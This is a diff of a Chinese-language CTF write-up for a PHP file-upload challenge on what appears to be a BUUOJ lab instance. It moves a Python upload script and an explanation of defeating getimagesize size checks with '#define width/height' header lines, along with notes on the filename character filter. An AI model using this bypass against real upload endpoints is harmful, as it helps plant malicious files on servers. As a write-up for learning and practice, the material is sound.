@@ -8,6 +8,8 @@
 
 ## wp
 
+### index.php
+
 给了源码
 
 ```php
@@ -37,7 +39,47 @@ if($ctf=="upload") {
 }}
 ```
 
-example.php
+先看index.php内容，GET传ctf为upload，文件上传的参数名要是postedFile
+
+可以用Python传
+
+```python
+from urllib3 import encode_multipart_formdata
+import requests
+
+def sendFile(filePath):
+    url = "http://aa97a970-180f-4260-b3e3-fd92f6fd02bc.node4.buuoj.cn:81/?ctf=upload"
+    f = open(filePath, "rb")
+    file = {
+        "postedFile": ("123.png", f.read()),
+    }
+    
+    encodeData = encode_multipart_formdata(file)
+    fileData = encodeData[0]
+    
+    headersFromData = {
+        "Content-Type": encodeData[1],
+    }
+    
+    res = requests.post(url=url, headers=headersFromData, data=fileData)
+    return res
+    
+
+if __name__=='__main__':
+    res = sendFile('123.png')
+    print(res.text)
+```
+
+可以用`#define %s %d`的方式绕过`getimagesize`对宽高的限制。它的底层实现是，如果某一行格式满足`#define %s %d`，那么取出其中的字符串和数字，再从字符串中取出`width`或`height`，将数字作为图片的长和宽。
+
+```
+#define width 1
+#define height 1
+```
+
+然后文件名不能包含`i h p ph`这四个字符串，最后把文件名所有字符转成小写存储
+
+### example.php
 
 ```php
  <?php
@@ -73,39 +115,6 @@ if($ctf=="poc") {
         unlink($file);
 }}
 ```
-
-先看index.php内容，GET传ctf为upload，文件上传的参数名要是postedFile
-
-可以用Python传
-
-```python
-from urllib3 import encode_multipart_formdata
-import requests
-
-def sendFile(filePath):
-    url = "http://aa97a970-180f-4260-b3e3-fd92f6fd02bc.node4.buuoj.cn:81/?ctf=upload"
-    f = open(filePath, "rb")
-    file = {
-        "postedFile": ("123.png", f.read()),
-    }
-    
-    encodeData = encode_multipart_formdata(file)
-    fileData = encodeData[0]
-    
-    headersFromData = {
-        "Content-Type": encodeData[1],
-    }
-    
-    res = requests.post(url=url, headers=headersFromData, data=fileData)
-    return res
-    
-
-if __name__=='__main__':
-    res = sendFile('123.png')
-    print(res.text)
-```
-
-
 
 
 
